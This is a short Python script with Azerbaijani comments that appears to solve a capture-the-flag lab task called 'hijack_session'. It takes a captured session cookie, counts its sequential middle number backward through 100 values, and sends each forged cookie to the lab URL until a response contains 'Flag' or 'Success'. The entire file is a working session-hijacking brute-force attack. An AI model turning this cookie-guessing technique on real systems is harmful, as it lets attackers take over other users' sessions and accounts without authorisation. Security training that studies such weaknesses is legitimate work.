import requests

# Hədəf URL
url = "http://web0x01.hbtn/a1/hijack_session"

# Sizin əldə etdiyiniz sonuncu tokenin hissələri (Şəkildəki sonuncu sətirdən nümunə)
# Nümunə: 44eaa229-9ca7-4a61-85e-9323480-17686764333
# Bunu hissələrə bölürük:
prefix = "44eaa229-9ca7-4a61-85e"
current_count = 9323480 # Şəkildəki son rəqəmi bura yazın
timestamp_suffix = "17686764333" # Sondakı timestamp

# Geriyə doğru neçə addım yoxlayaq? (Məsələn, 100 sessiya geriyə)
attempts = 100

print("Axtarış başladı...")

for i in range(attempts):
    # Sayğacı azaldırıq (geriyə gedirik)
    target_count = current_count - i
    
    # Yeni cookie yaradırıq.
    # QEYD: Bəzən timestamp-i dəyişmək lazım olmaya bilər, 
    # server yalnız ortadakı rəqəmə baxa bilər.
    new_cookie_value = f"{prefix}-{target_count}-{timestamp_suffix}"
    
    cookies = {
        "hijack_session": new_cookie_value
    }
    
    try:
        response = requests.get(url, cookies=cookies)
        
        # Əgər uğurlu olarsa, səhifənin məzmunu və ya statusu dəyişəcək.
        # Adətən uğurlu girişdə "Flag" sözü və ya fərqli bir mətn çıxır.
        # Və ya sadəcə cavabın uzunluğu (len(response.text)) fərqli ola bilər.
        
        if "Flag" in response.text or "Success" in response.text:
            print(f"[+] TAPILDI! Cookie: {new_cookie_value}")
            print("Cavab:", response.text)
            break
        elif response.status_code == 200:
             # Sadəcə statusu yoxlayaq, bəlkə hər kəsə 200 verir, amma məzmun fərqlidir
             print(f"[{target_count}] Yoxlanılır... Status: {response.status_code} Length: {len(response.text)}")
             
    except Exception as e:
        print(f"Xəta: {e}")

print("Bitdi.")
